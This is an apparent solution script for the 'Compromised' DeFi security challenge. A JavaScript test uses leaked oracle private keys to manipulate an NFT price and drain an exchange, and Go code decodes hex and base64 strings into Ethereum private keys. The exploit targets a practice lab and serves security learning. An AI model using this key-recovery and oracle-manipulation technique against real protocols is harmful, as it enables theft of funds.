...
describe('Compromised challenge', function () {
  ...
  it('Execution', async function () {
    ...
    // create Wallet by private key
    const compromisedAddress1 = new ethers.Wallet(privateKey1, ethers.provider);
    const compromisedAddress2 = new ethers.Wallet(privateKey2, ethers.provider);

    const newPrice = 1n * 10n ** 16n;
    await oracle.connect(compromisedAddress1).postPrice('DVNFT', newPrice);
    await oracle.connect(compromisedAddress2).postPrice('DVNFT', newPrice);

    await exchange.connect(player).buyOne({ value: newPrice });

    await oracle
      .connect(compromisedAddress1)
      .postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE + newPrice);
    await oracle
      .connect(compromisedAddress2)
      .postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE + newPrice);
...
//go code with decode response to address, private key, public key
/**
 package main
...
func main() {
	...
	for i, response := range responses {
		...
		decoded, err := hex.DecodeString(strings.Replace(response, " ", "", -1))
		if err != nil {
			fmt.Printf("Error decoding %d: %s\n", i+1, err)
			continue
		}

		result := make([]byte, base64.StdEncoding.DecodedLen(len(decoded)))

		fmt.Printf("Decoded %d. \n ", i+1)
		fmt.Println(string(decoded))
		// decode encoding by base64 string
		fmt.Printf("Base64 encoded %d. \n ", i+1)
		_, _ = base64.StdEncoding.Decode(result, decoded)
		fmt.Println(string(result))

		// decode the base64 string to ethereum address
		pvk, err := crypto.HexToECDSA(string(result[2:]))
		if err != nil {
			fmt.Printf("Error decoding %d: %s\n", i+1, err)
			continue
		}
		...
		fmt.Printf("Ethereum address %d: %s\n", i+1, address)
...
// Logic
// 1. Decode the hex value with out space
// 2. Decode the base64 string to public key
// 3. Decode the base64 string to ethereum address
